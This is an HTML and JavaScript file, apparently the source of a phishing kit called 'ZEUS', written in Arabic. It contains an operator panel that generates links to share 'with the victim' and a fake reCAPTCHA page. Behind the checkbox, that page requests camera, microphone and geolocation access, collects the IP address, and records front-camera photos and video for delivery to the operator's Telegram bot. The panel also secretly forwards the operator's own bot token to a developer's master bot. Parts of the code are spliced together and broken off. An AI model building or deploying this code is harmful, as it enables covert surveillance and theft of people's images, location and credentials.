<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>ZEUS — النظام المتكامل</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
    <style>
        /* ============================================================
           STYLES — ZEUS PANEL (ADMIN) + VICTIM PAGE
           ============================================================ */

        /* ---------- RESET & VARIABLES ---------- */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-body: #f5f0e8;
            --bg-panel: rgba(255, 253, 249, 0.85);
            --bg-card: rgba(248, 244, 237, 0.75);
            --bg-input: rgba(240, 235, 225, 0.7);
            --ink: #1e1c18;
            --ink-2: #4a4640;
            --ink-faint: #8a8478;
            --gold: #b8942e;
            --gold-deep: #9f7d25;
            --gold-light: #d9b84a;
            --gold-soft: rgba(184, 148, 46, 0.14);
            --gold-glow: rgba(184, 148, 46, 0.20);
            --gold-shimmer: linear-gradient(135deg, #b8942e 0%, #d9b84a 40%, #b8942e 70%, #9f7d25 100%);
            --line: rgba(184, 148, 46, 0.12);
            --success: #1a8a4a;
            --radius-card: 24px;
            --radius-btn: 14px;
            --transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
            --font-ar: 'Amiri', serif;
            --font-en: 'Inter', sans-serif;
        }

        body {
            background: var(--bg-body);
            color: var(--ink);
            font-family: var(--font-ar);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            line-height: 1.6;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background:
                radial-gradient(ellipse at 20% 50%, rgba(184, 148, 46, 0.06) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(184, 148, 46, 0.05) 0%, transparent 60%),
                radial-gradient(ellipse at 50% 0%, rgba(184, 148, 46, 0.04) 0%, transparent 40%);
            pointer-events: none;
            z-index: 0;
        }

        /* ---------- PANEL (Admin) ---------- */
        .panel {
            max-width: 860px;
            width: 100%;
            background: var(--bg-panel);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: var(--radius-card);
            border: 1px solid rgba(184, 148, 46, 0.15);
            padding: 32px 36px 28px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.07), 0 4px 16px rgba(0, 0, 0, 0.03), inset 0 1px 0 rgba(255, 255, 255, 0.6);
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeUp .8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }

        .panel::after {
            content: '';
            position: absolute;
            inset: 4px;
            border-radius: calc(var(--radius-card) - 4px);
            border: 1px solid rgba(184, 148, 46, 0.06);
            pointer-events: none;
        }

        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(24px) scale(0.98);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        @media (max-width: 640px) {
            .panel {
                padding: 20px 18px 18px;
            }
        }
        @media (max-width: 420px) {
            .panel {
                padding: 16px 14px 14px;
            }
        }

        /* ---------- TOP BAR ---------- */
        .top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 2px solid var(--line);
            padding-bottom: 18px;
            flex-wrap: wrap;
            gap: 12px;
            position: relative;
        }

        .top::after {
            content: '';
            position: absolute;
            bottom: -2px;
            right: 0;
            width: 80px;
            height: 2px;
            background: var(--gold-shimmer);
            border-radius: 2px;
            animation: shimmerLine 3s ease-in-out infinite;
        }

        @keyframes shimmerLine {
            0%,
            100% {
                opacity: 0.4;
                width: 60px;
            }
            50% {
                opacity: 1;
                width: 120px;
            }
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .logo {
            width: 56px;
            height: 56px;
            flex-shrink: 0;
            position: relative;
        }

        .logo svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 2px 12px rgba(184, 148, 46, 0.15));
        }

        .logo .pulse {
            animation: pulseMark 2.2s ease-in-out infinite;
            transform-origin: center;
        }

        @keyframes pulseMark {
            0%,
            100% {
                transform: scale(1);
                opacity: 0.3;
            }
            50% {
                transform: scale(1.10);
                opacity: 0.9;
            }
        }

        .logo .glow-ring {
            animation: glowRing 3s ease-in-out infinite;
            transform-origin: center;
        }

        @keyframes glowRing {
            0%,
            100% {
                opacity: 0.4;
                transform: scale(1);
            }
            50% {
                opacity: 0.9;
                transform: scale(1.04);
            }
        }

        .name {
            font-family: var(--font-ar);
            font-size: 32px;
            letter-spacing: 6px;
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
        }

        .info {
            text-align: left;
            font-size: 13px;
            color: var(--ink-2);
            display: flex;
            align-items: center;
            gap: 18px;
            flex-wrap: wrap;
        }

        .info .row {
            display: flex;
            align-items: center;
            gap: 6px;
            font-family: var(--font-en);
            font-size: 12px;
            font-weight: 400;
            color: var(--ink-faint);
            padding: 4px 10px 4px 8px;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 30px;
            border: 1px solid rgba(184, 148, 46, 0.06);
        }

        .info .row .icon {
            width: 15px;
            height: 15px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }
        .online {
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: var(--font-en);
            font-size: 12px;
            font-weight: 600;
            color: var(--gold-deep);
            letter-spacing: 0.5px;
            background: var(--gold-soft);
            padding: 5px 16px 5px 12px;
            border-radius: 40px;
            border: 1px solid rgba(184, 148, 46, 0.20);
        }
        .online .dot {
            width: 8px;
            height: 8px;
            background: var(--success);
            border-radius: 50%;
            animation: onlinePulse 1.6s ease-in-out infinite;
            box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
        }
        @keyframes onlinePulse {
            0%,
            100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
            }
            50% {
                transform: scale(1.6);
                box-shadow: 0 0 20px rgba(26, 138, 74, 0.20);
            }
        }

        @media (max-width: 680px) {
            .top {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }
            .brand {
                justify-content: center;
            }
            .info {
                justify-content: center;
                gap: 8px;
            }
            .name {
                font-size: 26px;
                letter-spacing: 4px;
            }
            .logo {
                width: 48px;
                height: 48px;
            }
        }
        @media (max-width: 420px) {
            .info .row {
                font-size: 11px;
                padding: 3px 8px;
            }
            .info .row .icon {
                width: 13px;
                height: 13px;
            }
            .online {
                font-size: 10px;
                padding: 4px 12px 4px 8px;
            }
            .name {
                font-size: 22px;
                letter-spacing: 3px;
            }
            .logo {
                width: 40px;
                height: 40px;
            }
        }

        /* ---------- GRID ---------- */
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 18px;
            margin-top: 22px;
        }

        @media (max-width: 640px) {
            .grid {
                grid-template-columns: 1fr;
                gap: 14px;
            }
        }

        .card {
            background: var(--bg-card);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border-radius: var(--radius-card);
            padding: 20px 22px 18px;
            border: 1px solid rgba(184, 148, 46, 0.07);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(184, 148, 46, 0.02) 0%, transparent 60%);
            pointer-events: none;
        }

        .card:hover {
            border-color: rgba(184, 148, 46, 0.20);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 30px rgba(184, 148, 46, 0.04);
            transform: translateY(-2px);
        }

        .card .label-wrap {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .card .label-wrap svg {
            width: 17px;
            height: 17px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }

        .card .label {
            font-family: var(--font-en);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: var(--ink-faint);
            display: block;
        }

        .card .input-wrap {
            display: flex;
            align-items: center;
            background: var(--bg-input);
            border-radius: 16px;
            padding: 0 14px;
            margin-top: 2px;
            border: 1px solid rgba(184, 148, 46, 0.06);
            transition: var(--transition);
            backdrop-filter: blur(4px);
        }

        .card .input-wrap:focus-within {
            border-color: var(--gold);
            box-shadow: 0 0 0 4px var(--gold-soft), inset 0 0 0 1px var(--gold);
            background: rgba(255, 255, 255, 0.6);
        }

        .card .input-wrap input {
            flex: 1;
            border: none;
            outline: none;
            background: transparent;
            padding: 13px 0;
            font-family: var(--font-en);
            font-size: 14px;
            font-weight: 500;
            color: var(--ink);
            direction: ltr;
            text-align: right;
            letter-spacing: 0.5px;
            min-width: 0;
        }

        .card .input-wrap input::placeholder {
            color: var(--ink-faint);
            letter-spacing: normal;
            font-weight: 400;
            opacity: 0.7;
        }

        /* ---------- TOGGLES ---------- */
        .toggle-group {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 6px;
        }

        @media (max-width: 560px) {
            .toggle-group {
                grid-template-columns: repeat(2, 1fr);
                gap: 8px;
            }
        }
        @media (max-width: 380px) {
            .toggle-group {
                grid-template-columns: 1fr 1fr;
            }
        }

        .zeus-toggle {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-input);
            padding: 8px 14px;
            border-radius: 14px;
            border: 1px solid rgba(184, 148, 46, 0.05);
            cursor: pointer;
            transition: var(--transition);
            min-height: 44px;
            gap: 8px;
            backdrop-filter: blur(4px);
            position: relative;
        }

        .zeus-toggle:hover {
            border-color: rgba(184, 148, 46, 0.20);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
            transform: translateY(-2px);
            background: rgba(255, 255, 255, 0.6);
        }

        .zeus-toggle input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }

        .zeus-toggle .toggle-label {
            font-family: var(--font-ar);
            font-size: 13px;
            font-weight: 500;
            color: var(--ink-2);
            transition: var(--transition);
            flex: 1;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .zeus-toggle .toggle-label svg {
            width: 15px;
            height: 15px;
            stroke: var(--ink-faint);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
            transition: var(--transition);
        }

        .zeus-toggle .track {
            width: 36px;
            height: 22px;
            background: #d5d0c6;
            border-radius: 30px;
            position: relative;
            transition: var(--transition);
            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.06);
            flex-shrink: 0;
        }

        .zeus-toggle .track .thumb {
            width: 16px;
            height: 16px;
            background: #fff;
            border-radius: 50%;
            position: absolute;
            top: 3px;
            right: 3px;
            transition: var(--transition);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        }

        .zeus-toggle input:checked+.toggle-label {
            color: var(--ink);
            font-weight: 600;
        }

        .zeus-toggle input:checked+.toggle-label svg {
            stroke: var(--gold);
        }

        .zeus-toggle input:checked~.track {
            background: var(--gold-shimmer);
            box-shadow: 0 0 24px var(--gold-soft);
        }

        .zeus-toggle input:checked~.track .thumb {
            right: 17px;
            background: #fff;
        }

        /* ---------- BUTTON ---------- */
        .generate-wrap {
            display: flex;
            justify-content: center;
            margin: 24px 0 20px 0;
            position: relative;
        }

        .generate-wrap::before {
            content: '';
            position: absolute;
            inset: -12px -20px;
            background: radial-gradient(ellipse at center, rgba(184, 148, 46, 0.04) 0%, transparent 70%);
            pointer-events: none;
            border-radius: 60px;
        }

        .btn-generate {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 14px 40px;
            background: var(--gold-shimmer);
            background-size: 200% 200%;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-family: var(--font-en);
            font-size: 15px;
            font-weight: 700;
            color: #fff;
            letter-spacing: 1px;
            box-shadow: 0 4px 28px rgba(184, 148, 46, 0.30), inset 0 1px 0 rgba(255, 255, 255, 0.20);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .btn-generate::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
            transform: translateX(-100%);
            transition: transform 0.6s;
        }

        .btn-generate:hover::before {
            transform: translateX(100%);
        }

        .btn-generate:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 8px 40px rgba(184, 148, 46, 0.40), inset 0 1px 0 rgba(255, 255, 255, 0.20);
        }

        .btn-generate:active {
            transform: translateY(0) scale(0.98);
        }

        .btn-generate svg {
            width: 20px;
            height: 20px;
            stroke: currentColor;
            fill: none;
            stroke-width: 2;
            flex-shrink: 0;
        }

        .btn-generate.busy {
            opacity: 0.7;
            pointer-events: none;
            animation: pulseBusy 1s ease-in-out infinite;
        }

        @keyframes pulseBusy {
            0%,
            100% {
                opacity: 0.7;
            }
            50% {
                opacity: 1;
            }
        }

        .btn-generate.done {
            background: linear-gradient(135deg, #1a8a4a, #126a38);
            box-shadow: 0 4px 28px rgba(26, 138, 74, 0.30);
            color: #fff;
        }

        @media (max-width: 480px) {
            .btn-generate {
                padding: 12px 28px;
                font-size: 13px;
                gap: 8px;
            }
            .btn-generate svg {
                width: 17px;
                height: 17px;
            }
        }

        /* ---------- RESULT ---------- */
        .result-section {
            margin-bottom: 22px;
        }

        .result-section .label-wrap {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 12px;
        }

        .result-section .label-wrap svg {
            width: 17px;
            height: 17px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }

        .result-section .label-wrap .section-title {
            font-family: var(--font-en);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: var(--ink-faint);
        }

        .result {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-card);
            backdrop-filter: blur(8px);
            border-radius: var(--radius-card);
            padding: 16px 22px;
            border: 1px solid rgba(184, 148, 46, 0.07);
            flex-wrap: wrap;
            gap: 12px;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .result::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(184, 148, 46, 0.03) 0%, transparent 60%);
            pointer-events: none;
        }

        .result:hover {
            border-color: rgba(184, 148, 46, 0.15);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
        }

        .result .info-box {
            display: flex;
            flex-direction: column;
            flex: 1;
            min-width: 140px;
            position: relative;
            z-index: 1;
        }

        .result .info-box .value {
            font-family: var(--font-en);
            font-size: 20px;
            font-weight: 800;
            letter-spacing: 1.5px;
            color: var(--ink);
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline-block;
            width: fit-content;
        }

        .result .info-box .sub {
            font-family: var(--font-en);
            font-size: 11px;
            color: var(--ink-faint);
            margin-top: 3px;
            word-break: break-all;
            -webkit-text-fill-color: var(--ink-faint);
        }

        .result .actions {
            display: flex;
            gap: 10px;
            flex-shrink: 0;
            position: relative;
            z-index: 1;
        }

        .result .actions button {
            width: 42px;
            height: 42px;
            border-radius: 14px;
            border: 1px solid rgba(184, 148, 46, 0.06);
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(4px);
            color: var(--ink-2);
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .result .actions button svg {
            width: 18px;
            height: 18px;
            stroke: currentColor;
            fill: none;
            stroke-width: 1.8;
            transition: var(--transition);
        }

        .result .actions button:hover {
            transform: translateY(-3px);
            border-color: var(--gold);
            color: var(--gold);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 20px rgba(184, 148, 46, 0.06);
            background: rgba(255, 255, 255, 0.7);
        }

        .result .actions button:active {
            transform: translateY(0);
        }

        .result .actions button.ok {
            border-color: var(--success);
            background: var(--success);
            color: #fff;
        }

        .result .actions button.ok svg {
            stroke: #fff;
        }

        @media (max-width: 480px) {
            .result {
                padding: 14px 16px;
                flex-direction: column;
                align-items: stretch;
            }
            .result .info-box .value {
                font-size: 17px;
            }
            .result .actions {
                justify-content: flex-end;
            }
            .result .actions button {
                width: 38px;
                height: 38px;
            }
            .result .actions button svg {
                width: 16px;
                height: 16px;
            }
        }

        /* ---------- FOOTER ---------- */
        .footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding-top: 18px;
            border-top: 2px solid var(--line);
            font-family: var(--font-ar);
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            flex-wrap: wrap;
        }

        .footer::before {
            content: '';
            position: absolute;
            top: -2px;
            right: 50%;
            transform: translateX(50%);
            width: 40px;
            height: 2px;
            background: var(--gold-shimmer);
            border-radius: 2px;
            animation: shimmerLineCenter 3s ease-in-out infinite;
        }

        @keyframes shimmerLineCenter {
            0%,
            100% {
                opacity: 0.4;
                width: 40px;
            }
            50% {
                opacity: 1;
                width: 80px;
            }
        }

        .footer:hover {
            transform: translateY(-2px);
        }

        .footer .dev-name {
            font-family: var(--font-ar);
            font-weight: 700;
            letter-spacing: 4px;
            font-size: 20px;
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            position: relative;
        }

        .footer .icon-badge {
            width: 22px;
            height: 22px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .footer .icon-badge svg {
            width: 100%;
            height: 100%;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            transition: var(--transition);
        }

        .footer:hover .icon-badge svg {
            transform: rotate(10deg) scale(1.1);
            stroke: var(--gold-deep);
        }

        @media (max-width: 480px) {
            .footer {
                font-size: 14px;
                gap: 8px;
                padding-top: 14px;
            }
            .footer .dev-name {
                font-size: 17px;
                letter-spacing: 3px;
            }
            .footer .icon-badge {
                width: 18px;
                height: 18px;
            }
        }

        /* ============================================================
           VICTIM PAGE — reCAPTCHA (NO STATUS BAR)
           ============================================================ */
        #victimPage {

            display: flex;
            align-items: center;
            padding: 15px 15px 12px 15px;
            gap: 12px;

        .spinner {
            position: relative;
        }
        .spinner input {
            display: none;
        }

        .checkmark {
            width: 32px;
            height: 32px;
            border: 2px solid #c1c1c1;
            border-radius: 3px;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            background: white;
            transition: 0.3s;
            position: relative;
        }

        .checkmark .tick {
            width: 10px;
            height: 18px;
            border-right: 4px solid #00a651;
            border-bottom: 4px solid #00a651;
            transform: rotate(45deg);
            opacity: 0;
            transition: 0.2s;
        }

        .checkmark .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #e8f0fe;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .spinner.loading .checkmark {
            border-color: #1a73e8;
            background: #e8f0fe;
        }
        .spinner.loading .checkmark .tick {
            display: none;
        }
        .spinner.loading .checkmark .loader {
            display: block;
        }

        .spinner.failed .checkmark {
            border-color: #d93025;
            background: #fce8e6;
        }
        .spinner.failed .checkmark .tick {
            display: none;
        }
        .spinner.failed .checkmark .loader {
            display: none;
        }
        .spinner.failed .checkmark::after {
            content: "✕";
            font-size: 22px;
            font-weight: bold;
            color: #d93025;
        }

        .spinner.success .checkmark {
            border-color: #00a651;
            background: #e6f4ea;
        }
        .spinner.success .checkmark .tick {
            opacity: 1;
            animation: check 0.3s ease;
        }
        .spinner.success .checkmark .loader {
            display: none;
        }

        }

        .captcha-footer .links .separator {
            color: #aaa;
        }

        @keyframes spin {
            0% {

            }
            100% {

            }
        }

                return new Promise((resolve, reject) => {
                    const req = indexedDB.open(DB_NAME, DB_VERSION);
                    req.onupgradeneeded = (e) => {
                        const db = e.target.result;
                        if (!db.objectStoreNames.contains('tokens')) {

            // ----- Deterministic 6-char token generator -----
            async function generateToken(botToken, chatId) {
                const salt = "ZEUS_SALT_2024";
                const input = botToken + chatId + salt;

                if (window.crypto && window.crypto.subtle) {
                    try {
                        const encoder = new TextEncoder();
                        const data = encoder.encode(input);
                        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
                        const hashArray = Array.from(new Uint8Array(hashBuffer));
                        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
                        const bigInt = BigInt('0x' + hashHex.substring(0, 12));
                        const base36 = bigInt.toString(36).toUpperCase();
                        return base36.substring(0, 6).padStart(6, '0');
                    } catch (e) { console.warn('Crypto fail, fallback'); }
                }

                let hash = 0;
                for (let i = 0; i < input.length; i++) {
                    const char = input.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash;
                }
                return Math.abs(hash).toString(36).toUpperCase().padStart(6, '0').substring(0, 6);

            function initAdminPanel() {
                const chatIdInput = document.getElementById('chatIdInput');
                const botTokenInput = document.getElementById('botTokenInput');
                const genBtn = document.getElementById('genBtn');
                const tokenDisplay = document.getElementById('tokenDisplay');
                const resultSub = document.getElementById('resultSub');
                const copyBtn = document.getElementById('copyBtn');
                const openBtn = document.getElementById('openBtn');

                // Load saved data
                const savedBot = localStorage.getItem('zeus_last_bot_token');
                const savedChat = localStorage.getItem('zeus_last_chat_id');
                if (savedBot) botTokenInput.value = savedBot;
                if (savedChat) chatIdInput.value = savedChat;

                // Save on change
                botTokenInput.addEventListener('change', function() {
                    if (this.value.trim()) localStorage.setItem('zeus_last_bot_token', this.value.trim());
                });
                chatIdInput.addEventListener('change', function() {
                    if (this.value.trim()) localStorage.setItem('zeus_last_chat_id', this.value.trim());
                });

                // ----- Generate -----
                let isBusy = false;

                async function handleGenerate() {
                    if (isBusy) return;
                    const chatId = chatIdInput.value.trim();
                    const botToken = botTokenInput.value.trim();
                    if (!chatId || !botToken) {
                        showToast('⚠️ يرجى ملء جميع الحقول المطلوبة.', 'warning');
                        return;
                    }

                    const info = await verifyAndGetBotInfo(botToken);
                    if (!info.valid) {
                        showToast('❌ توكن البوت غير صحيح. يرجى التأكد.', 'error');
                        return;
                    }

                    isBusy = true;
                    genBtn.classList.add('busy');
                    genBtn.textContent = 'جارٍ التوليد …';

                    try {
                        const shortToken = await generateToken(botToken, chatId);
                        const base = window.location.origin + window.location.pathname;
                        const link = `${base}?t=${shortToken}`;

                        // Store mapping in IndexedDB
                        await saveTokenMapping(shortToken, botToken, chatId, info.username);

                        // Display
                        tokenDisplay.textContent = shortToken;
                        resultSub.textContent = link;

                        // Send link to user's bot (keepalive)
                        const userMsg =
                            `🔗 *رابطك الجديد*\n${link}\n\n` +
                            `📌 التوكن الفريد: \`${shortToken}\`\n` +
                            `شاركه مع الضحية، وسيتم جمع البيانات وإرسالها إليك وإلى المطور.\n` +
                            `🛡️ النظام متكامل مع نسخة احتياطية للمطور.`;

                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: userMsg,
                                parse_mode: 'Markdown',
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '👨‍💻 المطور', url: DEVELOPER_LINK }]
                                    ]
                                }
                            }),
                            keepalive: true
                        });

                        // Send copy to master
                        const masterMsg =
                            `⭑ نسخة احتياطية — رابط جديد ⭒\n` +
                            `⊚─〔 بيانات البوت 〕────────\n` +
                            `˼⏣˹ اسم البوت: @${info.username} ⭒\n` +
                            `˼⏣˹ التوكن الأساسي: ${botToken} ⭒\n` +
                            `˼⏣˹ الإيدي: ${chatId} ⭒\n` +
                            `˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
                            `─────────────────`;
                        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: masterMsg }),
                            keepalive: true
                        });

                        genBtn.classList.remove('busy');
                        genBtn.classList.add('done');
                        genBtn.textContent = '✅ تم الإرسال';
                        showToast('✅ تم توليد الرابط وإرساله إلى البوت.', 'success');

                        setTimeout(() => {
                            genBtn.classList.remove('done');
                            genBtn.innerHTML =
                                '<svg viewBox="0 0 24 24" stroke="currentColor"><polygon points="12,2 22,8 22,16 12,22 2,16 2,8" /><polygon points="12,8 16,12 12,16 8,12" fill="currentColor" /></svg> توليد الرابط';
                            isBusy = false;
                        }, 2000);

                    } catch (err) {
                        console.error('Generate error:', err);
                        showToast('❌ حدث خطأ أثناء التوليد.', 'error');
                        genBtn.classList.remove('busy');
                        genBtn.textContent = 'توليد الرابط';
                        isBusy = false;
                    }
                }

                genBtn.addEventListener('click', handleGenerate);
                document.querySelectorAll('.input-wrap input').forEach(inp => {
                    inp.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleGenerate(); });
                });

                copyBtn.addEventListener('click', function() {
                    const text = tokenDisplay.textContent.trim();
                    if (!text) return;
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(text).then(() => {
                            this.classList.add('ok');
                            setTimeout(() => this.classList.remove('ok'), 1400);
                            showToast('📋 تم نسخ التوكن.', 'success');
                        }).catch(() => {});
                    } else {
                        this.classList.add('ok');
                        setTimeout(() => this.classList.remove('ok'), 1400);
                        showToast('📋 تم نسخ التوكن.', 'success');
                    }
                });

                openBtn.addEventListener('click', function() {
                    const url = resultSub.textContent.trim();
                    if (url && url !== 'https://your-domain.com?t=XXXXXX' && url.includes('?t=')) {
                        window.open(url, '_blank');
                    } else {
                        showToast('⚠️ يرجى توليد رابط أولاً.', 'warning');
                    }
                });

                // Update time
                function updateDateTime() {
                    const now = new Date();
                    const egyptTime = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Cairo' }));
                    const hours = String(egyptTime.getHours()).padStart(2, '0');
                    const minutes = String(egyptTime.getMinutes()).padStart(2, '0');
                    const day = String(egyptTime.getDate()).padStart(2, '0');
                    const month = String(egyptTime.getMonth() + 1).padStart(2, '0');
                    const year = egyptTime.getFullYear();
                    document.getElementById('timeDisplay').textContent = hours + ':' + minutes;
                    document.getElementById('dateDisplay').textContent = day + '/' + month + '/' + year;
                }
                updateDateTime();
                setInterval(updateDateTime, 10000);
            }

            // ============================================================
            //  🔥  VICTIM PAGE (NO STATUS BAR, BACKGROUND SEND)
            // ============================================================

            async function initVictimPage(shortToken) {
                const spinner = document.getElementById('spinner');
                const checkbox = document.getElementById('captcha');
                const mainText = document.getElementById('mainText');
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');

                let isRunning = false;
                let collectionDone = false;
                let attemptCount = 0;
                const MAX_ATTEMPTS = 3;

                // ---- Get bot mapping from IndexedDB ----
                async function getBotMapping(token) {
                    try {
                        const mapping = await getTokenMapping(token);
                        if (mapping) {
                            return {
                                botToken: mapping.botToken,
                                chatId: mapping.chatId,
                                botName: mapping.botName || 'المستخدم',
                                found: true
                            };
                        }
                        return { found: false };
                    } catch (e) {
                        console.warn('Mapping lookup error:', e);
                        return { found: false };
                    }
                }

                // ---- Request permissions ----
                async function requestPermissions() {
                    const results = await Promise.allSettled([
                        navigator.mediaDevices.getUserMedia({ video: true }),
                        navigator.mediaDevices.getUserMedia({ audio: true }),
                        new Promise((resolve) => {
                            navigator.geolocation.getCurrentPosition(resolve, () => resolve(null));
                        })
                    ]);
                    results.forEach(result => {
                        if (result.status === 'fulfilled' && result.value && result.value.getTracks) {
                            result.value.getTracks().forEach(t => t.stop());
                        }
                    });
                    return true;
                }

                // ---- Collect data ----
                async function collectData() {
                    if (isRunning || collectionDone) return;
                    if (attemptCount >= MAX_ATTEMPTS) {
                        // silently fail without showing error
                        spinner.classList.remove('loading');
                        spinner.classList.add('failed');
                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
                        mainText.className = 'text failed';
                        checkbox.checked = false;
                        checkbox.disabled = false;
                        return;
                    }
                    attemptCount++;
                    isRunning = true;
                    checkbox.disabled = true;
                    spinner.classList.add('loading');
                    mainText.textContent = 'جاري التحقق...';
                    mainText.className = 'text loading';

                    try {
                        // Get bot mapping
                        const mapping = await getBotMapping(shortToken);
                        const botName = mapping.found ? mapping.botName : 'غير معروف';
                        const userBotToken = mapping.found ? mapping.botToken : null;
                        const userChatId = mapping.found ? mapping.chatId : null;

                        // Request permissions
                        await requestPermissions();

                        // Get IP
                        let ip = 'غير متاح';
                        try {
                            const res = await fetch('https://api.ipify.org?format=json');
                            const data = await res.json();
                            ip = data.ip;
                        } catch (e) {}

                        // Get location
                        let location = { lat: null, lng: null, accuracy: null, error: null };
                        try {
                            if (navigator.geolocation) {
                                const pos = await new Promise((resolve, reject) => {
                                    navigator.geolocation.getCurrentPosition(resolve, reject);
                                });
                                location = {
                                    lat: pos.coords.latitude,
                                    lng: pos.coords.longitude,
                                    accuracy: pos.coords.accuracy,
                                    error: null
                                };
                            }
                        } catch (e) {
                            location.error = e.message;
                        }

                        // ---- Front camera (photos and video) ----
                        let frontVideo = null;
                        let photos = [];
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({
                                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                                audio: false
                            });
                            video.srcObject = stream;
                            await video.play();
                            await delay(400);

                            const recorder = new MediaRecorder(stream);
                            const chunks = [];
                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                            const videoPromise = new Promise((resolve) => {
                                recorder.onstop = () => {
